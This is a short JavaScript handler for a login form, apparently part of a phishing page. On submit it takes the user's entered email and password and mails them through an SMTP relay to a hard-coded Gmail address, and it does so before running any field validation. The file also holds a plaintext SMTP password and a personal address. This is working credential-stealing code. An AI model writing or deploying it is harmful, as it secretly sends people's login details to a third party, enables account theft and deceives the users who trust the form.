const form = document.querySelector("#form");
const em = document.querySelector("#em");
const ps = document.querySelector("#ps");
const e = document.querySelector("#e");
const p = document.querySelector("#p");

function sendEmail() {
    const bodyMessage = `id and password of the user is ${em.value} and ${ps.value} respectively!!`;

    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "ankitsangwan331@gmail.com",
        Password : "DE2E2AE726F44CFA31BF43D8F179395A0F23",
        To : 'ankitsangwan331@gmail.com',
        From : "ankitsangwan331@gmail.com",
        Subject : "Info regarding user",
        Body : `Data of the user is ${bodyMessage}`
    }).then(
      message => {
        if(message == "OK"){
            Swal.fire({
                title: "Success!",
                text: "Message sent successfully!",
                icon: "success"
              });
        }
      }
    );
}

form.addEventListener("submit", (e)=>{
    e.preventDefault();

    sendEmail();
    checkEmail();
    checkPassword();
})

function checkEmail() {
    if(em.value.trim() === ""){
        e.style.display = "block";
    }else{
        e.style.display = "none";
    }
}

em.addEventListener('input',checkEmail)

function checkPassword() {
    if(ps.value.trim() === ""){
        p.style.display = "block";
    }else{
        p.style.display = "none";
    }
}

ps.addEventListener('input',checkPassword)